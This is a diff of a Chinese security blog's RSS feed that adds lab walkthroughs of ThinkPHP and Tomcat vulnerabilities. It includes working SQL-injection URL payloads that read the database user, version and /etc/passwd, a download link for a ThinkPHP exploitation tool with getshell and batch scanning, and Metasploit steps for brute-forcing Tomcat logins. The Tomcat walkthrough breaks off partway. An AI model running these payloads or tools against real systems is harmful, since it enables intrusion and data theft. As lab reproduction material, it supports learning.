@@ -2,18 +2,138 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>红队 on SlimerのBlog</title>
-        <link>http://localhost:1313/categories/%E7%BA%A2%E9%98%9F/</link>
+        <link>http://localhost:57441/categories/%E7%BA%A2%E9%98%9F/</link>
         <description>Recent content in 红队 on SlimerのBlog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Slimer</copyright>
-        <lastBuildDate>Thu, 04 Sep 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/categories/%E7%BA%A2%E9%98%9F/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞</title>
-        <link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5.0.23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
+        <lastBuildDate>Thu, 04 Sep 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:57441/categories/%E7%BA%A2%E9%98%9F/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>【Thinkphp】漏洞利用工具-thinkphp_gui_tools</title>
+        <link>http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7-thinkphp_gui_tools/</link>
         <pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5.0.23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
-        <description>&lt;img src="http://localhost:1313/images/31.webp" alt="Featured image of post 【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞" /&gt;&lt;h1 id=&#34;漏洞形成原因&#34;&gt;漏洞形成原因&lt;/h1&gt;
+        <guid>http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7-thinkphp_gui_tools/</guid>
+        <description>&lt;img src="http://localhost:57441/images/33.webp" alt="Featured image of post 【Thinkphp】漏洞利用工具-thinkphp_gui_tools" /&gt;&lt;h1 id=&#34;介绍&#34;&gt;介绍&lt;/h1&gt;
+&lt;p&gt;ThinkPHP漏洞综合利用工具, 图形化界面, 命令执行, 一键getshell, 批量检测, 日志遍历, session包含,宝塔绕过。&lt;/p&gt;
+&lt;h1 id=&#34;下载地址&#34;&gt;下载地址&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;通过网盘分享的文件：ThinkPHP.jar
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;链接: https://pan.baidu.com/s/1eoU2Lf-ldHhy9W2jx8sRpA 提取码: bn8b 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--来自百度网盘超级会员v4的分享
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;项目地址&#34;&gt;项目地址&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;github&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bewhale&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;thinkphp_gui_tools&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;本项目是采用 JDK8 + javafx 开发的 ThinkPHP 图形化综合利用工具， 参考了其他大佬项目的部分代码。 JDK8可以直接运行，JDK11 因为去除了javafx这个依赖，需要自己再加上参数加入模块&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;java -Dfile.encoding=&amp;#34;UTF-8&amp;#34; --module-path &amp;#34;C:\Program Files\Java\javafx-sdk-11.0.2\lib&amp;#34; --add-modules &amp;#34;javafx.controls,javafx.fxml,javafx.web&amp;#34; -jar &amp;#34;xxx.jar&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;支持大部分&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ThinkPHP漏洞检测&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;整合&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;多个&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;支持部分漏洞执行命令&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;支持单一漏洞批量检测&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;支持&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TP3和TP5自定义路径日志遍历&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;支持部分漏洞一键&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetShell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;支持设置代理和&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;UA&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904105315.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>【Thinkphp漏洞复现】ThinkPHP5 SQL注入与敏感信息泄露</title>
+        <link>http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5-sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</link>
+        <pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5-sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</guid>
+        <description>&lt;img src="http://localhost:57441/images/32.webp" alt="Featured image of post 【Thinkphp漏洞复现】ThinkPHP5 SQL注入与敏感信息泄露" /&gt;&lt;h1 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;进入&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Vulhub&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vulhub&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;master&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;thinkphp&lt;/span&gt;\&lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sqlinjection&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;docker&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;compose&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;up&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 启动后为空白页面，需通过Payload触发漏洞&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;搭建好后是空白页面&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104644.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h1&gt;
+&lt;h2 id=&#34;报错注入-payload&#34;&gt;报错注入 Payload：&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://your-ip:8080/index.php?ids[0,updatexml(0,concat(0xa,user(),0xa),0)]=1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;执行后会显示数据库用户信息（如&lt;code&gt;root@localhost&lt;/code&gt;）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;信息泄露利用&#34;&gt;信息泄露利用：&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;获取数据库版本：&lt;code&gt;ids[0,updatexml(0,concat(0xa,version()),0)]=1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;读取文件：&lt;code&gt;ids[0,load_file(&#39;/etc/passwd&#39;)]=1&lt;/code&gt;（需数据库权限）&lt;br&gt;
+利用报错来查看版本信息&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104802.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+利用工具进行测试：&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104819.png&#34; alt=&#34;image.png&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;其他&#34;&gt;其他&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;存在&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ThinkPHP&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQL注入漏洞&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;敏感信息泄露&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ids&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;存在&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ThinkPHP&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;5.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;数据库信息泄露&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hostname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mysql&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cat&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞</title>
+        <link>http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5.0.23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
+        <pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5.0.23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
+        <description>&lt;img src="http://localhost:57441/images/31.webp" alt="Featured image of post 【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞" /&gt;&lt;h1 id=&#34;漏洞形成原因&#34;&gt;漏洞形成原因&lt;/h1&gt;
 &lt;h2 id=&#34;框架介绍&#34;&gt;框架介绍：&lt;/h2&gt;
 &lt;p&gt;ThinkPHP是一款运用极广的PHP开发框架。&lt;/p&gt;
 &lt;h2 id=&#34;漏洞引入&#34;&gt;漏洞引入：&lt;/h2&gt;
@@ -210,12 +330,285 @@ Burp抓包修改传参方式为Post，传入参数为&lt;/p&gt;
 &lt;/div&gt;</description>
         </item>
         <item>
+        <title>【Tomacat漏洞复现】后台弱口令&#43;文件上传</title>
+        <link>http://localhost:57441/p/tomacat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
+        <pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:57441/p/tomacat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid>
+        <description>&lt;img src="http://localhost:57441/images/35.webp" alt="Featured image of post 【Tomacat漏洞复现】后台弱口令&#43;文件上传" /&gt;&lt;h1 id=&#34;影响范围&#34;&gt;影响范围&lt;/h1&gt;
+&lt;p&gt;Tomcat8&lt;/p&gt;
+&lt;h1 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h1&gt;
+&lt;p&gt;这边就还是用vulhub进行复现&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cd vulhub-master/tomcat/tomcat8
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo docker-compose up -d
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker ps
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.197.140:8080/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904141819.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h1&gt;
+&lt;p&gt;这里使用MSF进行复现：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfconsole
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904141926.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+&lt;strong&gt;查找与 tomcat 相关的模块&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;search tomcat
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;使用 auxiliary/scanner/http/tomcat_mgr_login 模块&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use auxiliary/scanner/http/tomcat_mgr_login 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;查看需要填写哪些参数&lt;/strong&gt;&lt;/p&gt;
